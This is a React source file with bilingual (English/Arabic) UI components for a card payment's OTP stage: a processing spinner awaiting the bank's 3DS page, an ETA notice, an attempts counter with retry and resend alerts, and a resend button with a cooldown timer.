import React from 'react';

export function OtpEtaNotice({ text }) {
  return (
    <div className="otp-eta-notice">
      <span className="otp-eta-icon" aria-hidden="true">
        <svg viewBox="0 0 24 24" width="18" height="18" fill="none">
          <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="2" />
          <path d="M12 7v5l3 2" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
        </svg>
      </span>
      <p>{text}</p>
    </div>
  );
}

export function CardProcessingToOtpScreen({ lang, etaText }) {
  const isRtl = lang === 'ar';
  return (
    <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
      <div className="cc-otp-await buy-span-2">
        <div className="cc-otp-spinner" aria-hidden="true" />
        <div className="cc-otp-await-title">
          {isRtl ? 'جاري معالجة الدفع...' : 'Processing payment...'}
        </div>
        <div className="cc-otp-await-sub">
          {isRtl
            ? 'انتظر حتى تجهّز صفحة التحقق في البنك (3DS)'
            : 'Wait until the bank 3DS verification page is ready'}
        </div>
        <div className="otp-processing-extras">
          <OtpEtaNotice text={etaText} />
        </div>
      </div>
    </div>
  );
}

export function OtpVerificationExtras({
  t,
  otpAttempts,
  otpMaxAttempts,
  otpRemaining,
  otpRetryNotice,
  otpResendNotice,
}) {
  const attemptCurrent = Math.min(otpAttempts + 1, otpMaxAttempts);
  return (
    <div className="otp-verification-extras">
      <div className="otp-attempts-bar">
        <span>
          {t.otpAttemptLabel
            .replace('{current}', String(attemptCurrent))
            .replace('{max}', String(otpMaxAttempts))}
        </span>
        {otpRemaining < otpMaxAttempts && (
          <span className="otp-attempts-remaining">
            {t.otpRemainingAttempts.replace('{count}', String(otpRemaining))}
          </span>
        )}
      </div>

      {otpRetryNotice && (
        <div className="otp-alert otp-alert-warn" role="alert">
          {t.otpWrongRetry}
        </div>
      )}

      {otpResendNotice && (
        <div className="otp-alert otp-alert-ok">{t.otpResendSent}</div>
      )}
    </div>
  );
}

export function OtpResendButton({ t, loading, cooldown, disabled, onResend }) {
  return (
    <button
      type="button"
      className="otp-resend-btn"
      onClick={onResend}
      disabled={disabled}
    >
      {loading ? (
        <span className="cc-otp-spinner otp-resend-spinner" aria-hidden="true" />
      ) : (
        <>
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" aria-hidden="true">
            <path
              d="M4 12a8 8 0 0 1 13.7-5.7M20 6v5h-5M20 12a8 8 0 0 1-13.7 5.7M4 18v-5h5"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            />
          </svg>
          <span>
            {cooldown > 0
              ? t.otpResendWait.replace('{sec}', String(cooldown))
              : t.otpResend}
          </span>
        </>
      )}
    </button>
  );
}